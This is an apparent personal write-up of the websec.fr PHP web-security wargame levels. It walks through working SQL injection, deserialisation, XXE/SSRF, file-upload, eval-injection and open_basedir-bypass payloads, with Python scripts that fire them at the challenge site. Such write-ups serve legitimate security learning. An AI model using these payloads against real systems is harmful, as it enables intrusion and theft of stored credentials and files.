# websec.fr Writeups

I did some of the levels from this lovely website:

{% embed url="https://websec.fr/" }

## Level 01

Vulnerable code:
```php
$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';        
$getUsers = $pdo->query($query);        
$users = $getUsers->fetchArray(SQLITE3_ASSOC);
```
Lack of input validation into query, `$injection` is taken from user input. The `$users` has to return true otherwise nothing will be returned. 

This cannot be scripted because there is a anti-CSRF token, which is not something I will bypass. This requires UNION selection since I have to retrieve results from the query.

First, check number of columns, which is 2:

```sql
1 UNION SELECT null,null;--
```

Then, need to find the database structure via the second column which is injectable since `username` is printed second.

```sql
1 UNION SELECT 1,sqlite_version();--
```

![](../../.gitbook/assets/Pasted%20image%2020240124224224.png)

```sql
1 UNION SELECT null,group_concat(tbl_name) FROM sqlite_master WHERE type='table';--
```

The above returns users. 

```sql
1 UNION SELECT null,group_concat(name) as column_names FROM pragma_table_info('users');--
```

Returns `id`, `username` and `password`.

```sql
1 UNION SELECT null, group_concat(password) FROM users;--
```

Finds flag: `WEBSEC{Simple_SQLite_Injection}`
`group_concat` returns a concatenated string, so can return multiple strings. 

## Level 02

SQL Injection with `preg_replace` that blocks `union`, `order`, `select`, `from`, `group`, and `by`.
However, it replaces the string with `''` if it finds it, and doesn't block the request.
`SESELECTLECT` would become `SELECT` after replacing since the middle `SELECT` is replaced.

```sql
1 UNUNIONION SESELECTLECT null,grgroupoup_concat(password) frfromom users;--
```

`WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`.

## Level 03

The trick here is that SHA-1 does accept other variables like arrays.

```php
if(isset($_POST['c'])) {
	$h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
	if (password_verify (sha1($flag, fa1se), $h2) === true) {
	       win();
	    }
	else {
			give_sha1_hash_of_flag();
	}
}
```

Interestingly, I can **choose** the hash to be compared. 
The hash of the flag is `7c00249d409a91ab84e3f421c193520d9fb3674b`. 

Also, the functions aren't using FALSE!! This means that everything is returned as raw.

This means `password_hash` returns `\x7c\x00...`.
The null byte in the second position, and since PHP uses underlying functions for stuff, **it reads it as the end of the string**.

This means that `password_verify` is comparing `\x7c` only. So, just need to find a hash that starts with `7c00` so that it also goes through the same string truncation and retunrs true:

```python
import hashlib

i = 0
while True:
	test_hash = hashlib.sha1(str(i).encode())
	if test_hash.hexdigest().startswith('7c00'):
		print(i)
		break
	i += 1
```

This returns 104610: `WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}`

## Level 04

Deserialisation exploit here:

```php
if (isset ($_COOKIE['leet_hax0r'])) {    
	$sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));  
    try {  
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {  
            die('CANT HACK US!!!');  
        }  
    } catch(Exception $e) {  
        echo $e;  
    }  
} else {
	$cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;    
	setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));  
}
```

This cookie is used in conjunction with  `__destruct()`, allowing for PHP Object Injection. This allows me to inject my own code into the machine. 

```php
  public function __destruct() {  
        if (!isset ($this->conn)) {            
	        $this->connect ();  
        }               
		$ret = $this->execute ();  
        if (false !== $ret) {      
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {  
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';  
            }  
        }  
    }
```

Can set our own cookie and this would let me inject my own SQL class, and hence execute my own queries! The cookie allows for usage of "PHP POP Chains" via `__construct()` magic methods.

Using this, we can change the `$query` executed via injecting `__construct()` commands.

```php
<?php

class SQL {
    public $query;
    public $conn;
    public function __construct() {
        $this->query = "SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'";
        $this->conn = NULL;
    }
}

$obj = new SQL();
echo urlencode((base64_encode(serialize($obj))));
?>
```

Above doesn't really work because we need to cast the variable as `username`, else it will **not be printed**. This would print `users` as the table. 
Then just run `SELECT group_concat(password) as username FROM users;` to get flag `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`.

## Level 05

```php
<?php
  ini_set('display_errors', 'on');
  ini_set('error_reporting', E_ALL ^ E_DEPRECATED);

  if (isset ($_REQUEST['q']) and is_string ($_REQUEST['q'])):
      require 'spell.php';  # implement the "correct($word)" function

$q = substr ($_REQUEST['q'], 0, 256);  # Our spellchecker is a bit slow, do not DoS it please.
$blacklist = implode (["'", '"', '(', ')', ' ', '`']);

$corrected = preg_replace ("/([^$blacklist]{2,})/ie", 'correct ("\\1")', $q);
?>

<?php echo htmlspecialchars($corrected); ?>
```

There is a max length of 256 chars (truncated via `substr`).
The most notable thing is the usage of `preg_replace` with the `/ie` option. 
This particular option allows for a **second argument to be evaluated as a PHP expression**.
In short, I can inject PHP code into this. 

Based on the website, the `$flag` variable is in `flag.php`.
I can't use brackets, but `{}` is allowed. 

Using `${flag}` returns nothing, meaning the `$flag` variable is not included yet. Since I can inject PHP expressions, using `include` should work.

However, I cannot use `''`,  meaning I cannot write `include 'flag.php'` within my payload. However, nothing is stopping me from specifying ANOTHER HTTP variable via GET:
`${include $_GET[f]}${flag}`
Afterwards, send this payload with `f=flag.php`, and you'll get the flag:

```python
import requests

url = 'https://websec.fr/level05/index.php?f=flag.php'
data = {
	'q':'${include	$_GET[f]}${flag}',
	'submit':''
}

r = requests.post(url,data=data)
print(r.text)
```

## Level 07

This has a bullet proof blacklist.

```php
function sanitize($str) {
    /* Rock-solid ! */
    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "+", "-"];
    $special2 = [".", "/",  ":", ";", "<", "=", ">", "?", "@"];
    $special3 = ["[", "]", "^", "_", "`", "\\", "|", "{", "}"];

    $sql = ["or", "is", "like", "glob", "join", "0", "limit", "char"];

    $blacklist = array_merge($special1, $special2, $special3, $sql);

    foreach ($blacklist as $value) {
        if (stripos ($str, $value) !== false)
            die ("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}
$query = 'SELECT id,login FROM users WHERE id=' . $injection;
```

No special chars allowed. I can use UNION to combine queries though! 

Testing shows me that there are 2 columns `id,login`.

```sql
5 UNION SELECT null,null
```

Now, they didn't limit `()` chars, allowing me to specify some subqueries.
The goal is to retrieve the password of the user where id = 1.

I cannot specify the word `password` because it contains `or`, so the short form `pass` will have to do.

To bypass this, I can first create a result set with 3 columns, and then union select that with users (which also has 3 columns).

This would ensure the LEFT and RIGHT queries for UNION have the same number of columns, allowing me to retrieve the data from the `users` table without specifying `password`.

```sql
5 union select id, pass from (select 5 as id, 5 as name, 5 as pass union select * from users) where id between 1 and 1
```

## Level 08

This allows GIFs to be uploaded, and then uses `include_once` to display the file. 
It uses `exif_imagetype` to check whether it is a GIF, which can be bypassed using magic bytes. Payload below can be used to dump the file:

```php
<?php var_dump(file_get_contents("flag.txt")); ?>
```

Afterwards, just write these bytes: `47 49 46 38 37 61` using Python.

```python
f = open('tmp','w')
f.write('\x47\x49\x46\x38\x36\x61' + '<?php var_dump(file_get_contents("flag.txt")); ?>')
f.close()
```

![](../../.gitbook/assets/Pasted%20image%2020240125151901.png)


## Level 09

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);
if( isset ($_GET['submit']) && isset ($_GET['c'])) {
    $randVal = sha1 (time ());

    setcookie ('session_id', $randVal, time () + 2, '', '', true, true);

    try {
        $fh = fopen('/tmp/' . $randVal, 'w');

        fwrite (
            $fh,
                   str_replace (
                ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
                '',
                $_GET['c']
            )
        );
        fclose($fh);
    } catch (Exception $e) {
        var_dump ($e->getMessage ());
    }
}

if (isset ($_GET['cache_file'])) {
    if (file_exists ($_GET['cache_file'])) {
        echo eval (stripcslashes (file_get_contents ($_GET['cache_file'])));
    }
}
?>
```

`sha1` of UNIX time stamp is created and stored in `randVal` (extractable based on Burp).
Afterwards, write a file to `/tmp/$randVal`.

Replace all special characters and write in based on parameter `c`. 
Then, if the right file is retrieved, `eval` the `stripcslashes` of it.
This returns strings with the `backslashes` stripped off .
Recognises **hex and control chars**.

From the documentation of this function:

![](../../.gitbook/assets/Pasted%20image%2020240129180943.png)

I tested this with some hex characters:

```php
<?php

$var = stripcslashes('\x45');
echo $var;

?>
// prints out 'G'
```
The `str_replace` does not block `\` chars.
The answer is rather simple:
- Convert payload to hex
- Let `stripcslashes` convert my hex payload to string and pass it to `eval`.
- Calculate time stamp based on the UNIX time stamp returned. 

Firstly, I converted this payload to a hex:
```php
var_dump(file_get_contents('flag.txt'));
```

```python
import requests
import re

payload = '''var_dump(file_get_contents("flag.txt"));'''
hex_payload = ''.join([f'\\x{char.encode("utf-8").hex()}' for char in payload])
# print(hex_payload)

s = requests.Session()
url = 'https://websec.fr/level09/index.php'
params = {
	'c':hex_payload,
	'submit':'Submit'
}

r = s.get(url, params=params)
print("[+] Uploaded file")

cookies = r.headers['Set-Cookie']
file_loc = re.search(r'session_id=([a-zA-Z0-9]+)', cookies).group(1)
flag_data = {
	'cache_file':'/tmp/{}'.format(file_loc)
}

r = s.get(url, params= flag_data)
print(r.text)
```

## Level 10
Loose comparison:

```php
$hash = substr (md5 ($flag . $file . $flag), 0, 8);
// truncated //
if ($request == $hash) {
	show_source($file);
}
```

The `md5` hash is constant, and we need to somehow make it start with `0e` and do integer comparison. 

The `$file` parameter is taken from our input, and used to calculate hash. In order to add to `$flag` while pointing to the same file, use `.//////` 

```python
import requests

url = 'https://websec.fr/level10/index.php'
pre = '.'
file = 'flag.php'
data = {
	'f': pre + file,
	'hash':'0e111111'
}
headers={'Content-Type':'application/x-www-form-urlencoded'}

while True:
	r = requests.post(url, data=data, headers=headers)
	if 'WEBSEC' in r.text:
		print(r.text)
		break
	pre += '/'
	# print(pre+file)
```

Eventually, the flag will come out because the hash keeps changing each time. This is the fastest method since I cannot pre-calculate the hash via `$flag` variable.

`WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}`

## Level 11

This function has a sanitisation check:

```php
<?php

function sanitize($id, $table) {
    /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */
    if (! is_numeric ($id) or $id < 2) {
        exit("The id must be numeric, and superior to one.");
    }

    /* Rock-solid too! */
    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
    foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
            exit("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}
?>
```

This blocks all special characters, as well as check for UNION, JOIN and AS (and 0). The `id` parameter is checked to be numeric. Only the `table` parameter is greatly checked. 

The `()` characters are missing from the blacklist. There also some words like 'SELECT', 'WHERE' and 'LIKE' that can be abused. Also, the `As` keyword has been hinted. 

```sql
SELECT id,username FROM <table> WHERE id = <id>;

-- if replace the <table> paramter with a bracket
SELECT id,username FROM (select id,username from enemy)
```

`is_numeric` can be forced to return true if it detects 'E' in the string, as `numeric strings` return true.
`AS` is not needed to rename a column or table with an Alias. 
So the query can be:
```sql
SELECT 2,username FROM (SELECT 2 id,username enemy from costume where id like 1)
```

SQLite often supports the need for an Alias name via `as`. 

```sql
-- With AS keyword
SELECT column_name AS alias_name
FROM table_name;

-- Without AS keyword (often supported)
SELECT column_name alias_name
FROM table_name;
```

So the answer is to submit a subquery (via `()`) and get the flag.

![](../../.gitbook/assets/Pasted%20image%2020240126140527.png)

Final query:

```sql
SELECT 2,username FROM (SELECT 2 /*AS*/ id,enemy /*AS*/ username FROM costume)
```

`SELECT 2 AS ID` would make the integer 2 represented as ID , and the column enemy aliased to `username`, which is printed on screen and hence the flag.

## Level 12

This is PHP Injection!

![](../../.gitbook/assets/Pasted%20image%2020240129184036.png)

Problem is, I don't have the source code and I don't know what classes are available within this code.

So the first step is to figure out what classes are definitely within the code. So for a start, this thing does `echo new ();`

`new` doesn't do anything special, but `echo` is rather interesting. 
`echo` takes in a `string` parameter. 

In this particular case, `new` would define a class object that is passed, and `echo` needs to convert that to a string. Searching for functions like that brings up `__toString()`, a magic method that does what it name says.

So since we know `__toString()` is a function that is used, I can find all the classes that contain this function. 

I had to look up a walkthrough since I could not solve this. The solution was to find all classes using this:

```php
<?php

$classes = get_declared_classes();

foreach ($classes as $cls) {
    if (method_exists($cls, '__toString')) {
        echo "--> " . $cls . PHP_EOL;
    }
}
?>
```

However, this didn't work on my machine since I don't have the XML class for whatever reason. Anyways, using the `SimpleXMLElement` class allows us to perform XXE injection since it forces the website to process XML.

How it is used is 
`SimpleXMLElement ($xml, $options)`
`$options` can be specified to `LIBXML_NOENT`:

![](../../.gitbook/assets/Pasted%20image%2020240129195223.png)

This value allows for us to perform XXE injection, with the payload being in `$xml`.
Here's a payload for the injection

```xml
<!DOCTYPE user [<!ENTITY internal SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]>  
<user>&internal;</user>
```

This gives us a huge base64 encoded string for `index.php`.

```php
<!DOCTYPE html>
<html>
<head>
	<title>#WebSec Level Twelve</title>

    <link href="/static/bootstrap.min.css" rel="stylesheet" />
    <link href="/static/websec.css" rel="stylesheet" />

    <link rel="icon" href="/static/favicon.png" type="image/png">
</head>
	<body>
		<div id="main">
			<div class="container">
				<div class="row">
					<h1>LevelTwelve <small> - This time, it's different.</small></h1>
				</div>
				<div class="row">
					<p class="lead">
						Since we trust you <em>very much</em>, you can instanciate a class of your choice, with two arbitrary parameters.</br>
						Well, except the dangerous ones, like <code>splfileobject</code>, <code>globiterator</code>, <code>filesystemiterator</code>,
						and <code>directoryiterator</code>.<br>
 						Lets see what you can do with this.
                    			</p>
				</div>
			</div>
			<br>
			<div class="container">
				<div class="row">
					<form name="username" method="post" class="form-inline">
						<samp>
						<div class="form-group">
							<label for="class" class="sr-only">class</label>
							echo <span class='text-success'>new</span>
							<input type="text" class="form-control" id="class" name="class" placeholder="class" required>
							(
						</div>
						<div class="form-group">
							<label for="param1" class="sr-only">first parameter</label>
							<input type="text" class="form-control" id="param1" name="param1" placeholder="first parameter" required>
							,
						</div>
						<div class="form-group">
							<label for="param2" class="sr-only">second parameter</label>
							<input type="text" class="form-control" id="param2" name="param2" placeholder="second parameter" required>
							);
						</div>
						</samp>
      						<button type="submit" class="btn btn-default">launch!</button>
					</form>
				</div>
                <?php
                ini_set('display_errors', 'on');
                ini_set('error_reporting', E_ALL);

                if (isset ($_POST['class']) && isset ($_POST['param1'])  && isset ($_POST['param2'])) {
                    $class = strtolower ($_POST['class']);

                    if (in_array ($class, ['splfileobject', 'globiterator', 'directoryiterator', 'filesystemiterator'])) {
			    die ('Dangerous class detected.');
                    } else {
			    $result = new $class ($_POST['param1'], $_POST['param2']);
			    echo '<br><hr><br><div class="row"><pre>' . $result . '</pre></div>';
		    }
                }
                ?>
			</div>
		</div>
	</body>
</html>

<?php
/*
Congratulation, you can read this file, but this is not the end of our journey.

- Thanks to cutz for the QA.
- Thanks to blotus for finding a (now fixed) weakness in the "encryption" function.
- Thanks to nurfed for nagging us about a cheat
*/

$text = 'Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==';
$key = ini_get ('user_agent');

if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
    if ($_SERVER['HTTP_USER_AGENT'] !== $key) {
    	die ("Cheating is bad, m'kay?");
    }
    
    $i = 0;
    $flag = '';
    foreach (str_split (base64_decode ($text)) as $letter) {
        $flag .= chr (ord ($key[$i++]) ^ ord ($letter));
    }
    die ($flag);
}
?>
```

The last part is an obvious hint that SSRF is the answer!
Here's the updated payload:

```xml
<!DOCTYPE user [<!ENTITY internal SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php'>]>  
<user>&internal;</user>
```

`WEBSEC{Many_thanks_to_hackyou2014_web400_MSLC_<3}`

## Level 13

Did some testing on this one:

```php
<?php
$tmp = explode(',',$_GET['ids']);
echo $tmp;
echo "\n";
  for ($i = 0; $i < count($tmp); $i++ ) {
        echo $tmp[$i];
        $tmp[$i] = (int)$tmp[$i];
        if( $tmp[$i] < 1 ) {
            unset($tmp[$i]);
        }
  }
  echo "\n";
  $selector = implode(',', array_unique($tmp));
  echo $selector;
  echo "\n"; 
?>
```

The above would use `,` as the delimiter, and put all the stuff in `$selector` for unique stuff, 
So if we submit 1,2,3, the variable would contain `123.`

Testing with more `,` allows me to see the variable the query uses:

```
$ curl -G --data-urlencode "ids=,,,,,1));SELECT 1" 127.0.0.1:4444/test.php                                 
Array

,1));SELECT 1
```

There is an additional `,` in front, removing some commas work:

```
$ curl -G --data-urlencode "ids=,,1)) UNION SELECT 1--" 127.0.0.1:4444/test.php 
Array

1)) UNION SELECT 1--
```

This would pass the query correctly without commas in the front. There are 3 columns via `UNION` testing. UNION is used in this case because we are appending a query at the end so I can retrieve more data. 

`SELECT 1 UNION SELECT 2` retrieves both 1 and 2, combining the results. Need to append data to the first query. Some further testing revealed I need a third comma to make it one line:

```
$ curl -G --data-urlencode "ids=,,,1)) UNION SELECT 1,2,user_password FROM users--" 127.0.0.1:4444/test.php
Array

1)) UNION SELECT 1,2,user_password FROM users--
```

![](../../.gitbook/assets/Pasted%20image%2020240126143123.png)

## Level 15

PHP Injection.

```php
if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
```

The `create_function` function is vulnerable to command injection. It doesn't show us the variable that is printed, because `$success` is pre-defined variable. 

`create_functions` allows us to create lambda functions, and we can try to change the `success` variable or something. It uses `eval` to run the functions. 

So to exploit this, we can first try to escape the code block we are in using this:

```php
// }; echo $flag;//
create_function('$flag', }; echo $flag; // all other code on line commented.
```

The above equates to :

```php
eval('echo $flag;')
```

![](../../.gitbook/assets/Pasted%20image%2020240126143913.png)

## Level 17

`strcasecmp` used:

```php
<?php                                
if (! strcasecmp ($_POST['flag'], $flag))  
	echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';
else  
    echo '<div class="alert alert-danger">Invalid flag, sorry</div>';
?>
```

The issue here is the `strcasecmp` has an issue when comparing a `string` to another data type, which returns NULL.
NULL == 0 is **true**. So, `flag` needs to be of another data type.

Submitting `flag[]=1` casts it as an array instead of a string.
`WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}`

## Level 18

Deserialisation problem again.
```php
<?php
include "flag.php";

if (isset ($POST['obj'])) {
    setcookie ('obj', $_POST['obj']);
} elseif (!isset ($_COOKIE['obj'])) {
    $obj = new stdClass;
    $obj->input = 1234;
    setcookie ('obj', serialize ($obj));
}
?>

<?php
    $obj = $_COOKIE['obj'];
    $unserialized_obj = unserialize ($obj);
    $unserialized_obj->flag = $flag;  
    if (hash_equals ($unserialized_obj->input, $unserialized_obj->flag))
        echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
    else 
        echo '<div class="alert alert-danger"><code>' . htmlentities($obj) . '</code> is an invalid object, sorry.</div>';
?>
```

There's a default `stdClass` set, and is serialised. So submitting empty inputs results in this:

![](../../.gitbook/assets/Pasted%20image%2020240129200214.png)

The interesting part is that the `$flag` object is put into the real `flag` attribute from our serialised.

`hash_equals` is bulletproof, so I have to somehow access `$flag` before the check Fortunately, PHP has pointers! So I can make my input point to the `$flag` variable.

```php
<?php

$obj = new stdClass;
$obj->flag = 'fake';
$obj->input = &$obj->flag;

$cookie = serialize($obj);
echo urlencode($cookie);
?>
//O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bs%3A4%3A%22fake%22%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D 
```

`WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}`

## Level 20
Deserialisation exploit here with some sanitisation:

```php
 if ( ! preg_match ('/[A-Z]:/', $data)) {
        return unserialize ($data);
    }

    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data )) {
        return unserialize ($data);
    }

```

The base64-decoded `$data` is passed to this function. 
First checks for whether the decoded data contains any capital letters, which is basically useless for me because I have to have capital letters regardless.

Moving onto the second. It checks for all forms of special characters, then it checks for the usual `O:` that all PHP serialised objects start with. 

The website uses a magic method with `__destruct()` to specify the `$flag` variable in the `Flag` class. So all I have to do is somehow invoke the `Flag` class via deserialisation.

{% embed url="https://www.php.net/manual/en/class.serializable.php" %}

The documentation reveals that while the Object (O) notation is blocked by regex, there is a 'Class' notation using C:. The class object can only be used to unserialise instances that implement serializable! 

```
$ echo 'C:4:"Flag":4:{s:0:}' | base64         
Qzo0OiJGbGFnIjo0OntzOjA6fQo=
$ curl 'https://websec.fr/level20/index.php' -H 'Cookie: data=Qzo0OiJGbGFnIjo0OntzOjA6fQo='
```

`WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}`

## Level 22

PHP `unset` resets a variable. Seems that all `system` functions cannot be used here.

```php

class A {
    public $pub;
    protected $pro ;
    private $pri;

    function __construct($pub, $pro, $pri) {
        $this->pub = $pub;
        $this->pro = $pro;
        $this->pri = $pri;
    }
}

include 'file_containing_the_flag_parts.php';
$a = new A($f1, $f2, $f3);

$funcs_internal = get_defined_functions()['internal'];

unset ($funcs_internal[array_search('strlen', $funcs_internal)]);
unset ($funcs_internal[array_search('print', $funcs_internal)]);
unset ($funcs_internal[array_search('strcmp', $funcs_internal)]);
unset ($funcs_internal[array_search('strncmp', $funcs_internal)]);

$funcs_extra = array ('eval', 'include', 'require', 'function');
$funny_chars = array ('\.', '\+', '-', '"', ';', '`', '\[', '\]');
$variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS');

$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);

$insecure = false;
foreach ($blacklist as $blacklisted) {
    if (preg_match ('/' . $blacklisted . '/im', $code)) {
        $insecure = true;
        break;
    }
}

if ($insecure) {
    echo 'Insecure code detected!';
} else {
    eval ("echo $code;");
}
```

Flag is located within `$a`. 
There's a while list of functions within `$funcs_internal` that is retrieved using `get_desired_functions`. 

The answer was to somehow dump out the value stored in A. Testing the input, it seems to allow me to specify `$blacklisted{1}`, which is equivalent to `[1]`.

{% embed url="https://stackoverflow.com/questions/8092248/php-curly-braces-in-array-notation" %}

Using `$blacklist{1}` would thus allow me to read that array. This means that the code is still evaluated via that function. Since I had to dump the object values, using `var_dump` is best, I just have to find it within the `blacklist` array.

```python
import requests

url = 'https://websec.fr/level22/index.php'
i = 0


while True:
    payload = {'code': '$blacklist{' + str(i) + '}'}
    r = requests.get(url, params=payload)

    if r.status_code == 200:
        lines = r.text.splitlines()
        print(str(i) +': '+ lines[-7])

        i += 1
    else:
        print(f"Error: {r.status_code}")
        break
```

Using this, I can find all the functions that are available within the array.
Eventually, I found `var_dump` and used that function to get my flag.

```python
import requests

url = 'https://websec.fr/level22/index.php'
i = 582
payload = {'code': '$blacklist{' + str(i) + '}($a)'}
r = requests.get(url, params=payload)
print(r.text)
```

`WEBSEC{But_I_was_told_that_OOP_was_flawless_and_stuff_:<}`

## Level 24
The code has a periodic clean up of uploads. 
There is a check on the code being in the proper format:

```php
if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
        } elseif (file_exists($_GET['filename'])){
            $data = file_get_contents($_GET['filename']);
        }
```

The code checks the data for the any `<?` PHP starting parts. This blocks all forms of PHP webshell uploads.
However,  this does not check for the `php` string, and one can use `php://filter` to upload stuff. 

So the code checks for the `$data` variable, which is sent in a POST request, and checks whether it contains any interpretable code, if it doesn't, then it does `file_get_contents(filename)`.

The exploit would be to first upload a base64 encoded string as the payload.
Afterwards, setting the filename to a `php://` filter would **decode the file and execute the php code**.

```python
import requests
import base64

s = requests.Session()
s.get('https://websec.fr/level24/index.php')
cookie = s.cookies.get_dict()['PHPSESSID']

payload = b"<?php echo file_get_contents('../../flag.php'); ?>"

filename = "php://filter/convert.base64-decode/resource=test.php"
url1 = "https://websec.fr/level24/index.php?p=edit&filename={0}".format(filename)

data = {
	'filename':filename,
	'data':base64.b64encode(payload).decode()
}

r1= s.post(url1,data = data)

url2= "https://websec.fr/level24/uploads/{0}/test.php".format(cookie)
r2 = s.get(url2)
print(r2.text)
```

{% embed url ="https://www.cdxy.me/?p=752 " %}

`WEBSEC{no_javascript_no_php_I_guess_you_used_COBOL_to_get_a_RCE_right?}`

## Level 25

This looks to be a arbitrary read vulnerability:

```php
<?php  
parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
foreach ($query as $k => $v) {  
	if (stripos($v, 'flag') !== false)
		die('You are not allowed to get the flag, sorry :/');  
}
include $_GET['page'] . '.txt';                  
?>
```
Actually, this is a LFI since it can execute PHP code/ 
There is a problem in `parse_url`, and URL parsers are exploitable by making the URL a bit weird :D

![](../../.gitbook/assets/Pasted%20image%2020240124234814.png)
https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/

`parse_url` returns false in this case because the host must be parsed when the string exists before the `/` but after the `//`. However, since I included `////`, the it determines that the host does not exist.

## Level 28

There's a race condition here.

```php
<?php
if(isset($_POST['submit'])) {
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }

  unlink($filename);
}
?>
```

`$filename` is fixed since my IP is fixed, and it is a hash.  
Writes uploaded file content to `$filename`, which is fixed!
Checks MD5 of `$filename` and `flag.php`. 
`checksum` bypassed via PHP loose type checking. 
`unlink` filename will delete it after 1 second. 

There is 1 second of which the file is present on the machine, and it can be accessed without going through the checks to read `flag.php`.

Just need to know the right name for said file. Should be pretty simple to script.

## Level 31

Command injection stuff:

```php
 <?php
ini_set('open_basedir', '/sandbox');
chdir('/sandbox');

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

if (isset ($_GET['c'])) {
    die (eval ($_GET['c']));
}
?>
```

`ini_set` sets the configuration to be `open_basedir`. 
There's also no validation on whatever `c` is .

I ran `phpinfo();` on it, and found that it was running PHP 7.3.31:
![](../../.gitbook/assets/Pasted%20image%2020240129210128.png)
There were a lot of `disable_functions`:
```
exec,passthru,shell_exec,system,proc_open,popen,mail,file_put_content,link,touch,readlink,imap_open,putenv	exec,passthru,shell_exec,system,proc_open,popen,mail,file_put_content,link,touch,readlink,imap_open,putenv
```

I found this challenge to bypass `open_basedir`:
https://flagbot.ch/posts/phuck3/

`open_basedir` can always be tightened, and when we set a new value, PHP  checks whether all the new paths are allowed by the old path.

I can first reset `open_basedir` to `/sandbox` again. Then, I can change directory to another one and attempt to change the `open_basedir` value again.



I was thinking just to run `ini_set` again with the previous directory:

```php
ini_set('open_basedir','/sandbox');
chdir('./tmp');
ini_set('open_basedir','..');

chdir('..');
chdir('..');
chdir('..');
chdir('..');

ini_set('open_basedir','/');
var_dump(file_get_contents('/flag.php'));
```

```
$ curl https://websec.fr/level31/index.php?c=ini_set%28%27open_basedir%27%2C%27%2Fsandbox%27%29%3B+chdir%28%27.%2Ftmp%27%29%3B+ini_set%28%27open_basedir%27%2C%27..%27%29%3B++chdir%28%27..%27%29%3B+chdir%28%27..%27%29%3B+chdir%28%27..%27%29%3B+chdir%28%27..%27%29%3B++ini_set%28%27open_basedir%27%2C%27%2F%27%29%3B+var_dump%28file_get_contents%28%27%2Fflag.php%27%29%29%3B&submit=Submit

WEBSEC{Cheers_to_Blaklis_for_his_phuck3_challenge_for_Insomnihack_2019}
```

Funny that I happened to find the exact challenge referenced. 
`/tmp` directory is created by default within the `/sandbox` dir.

This was found using:
```php
$files = scandir('.'); foreach ($files as $file) { echo $file; }
# produces ...tmp
# so I know /sandbox/tmp exists!
```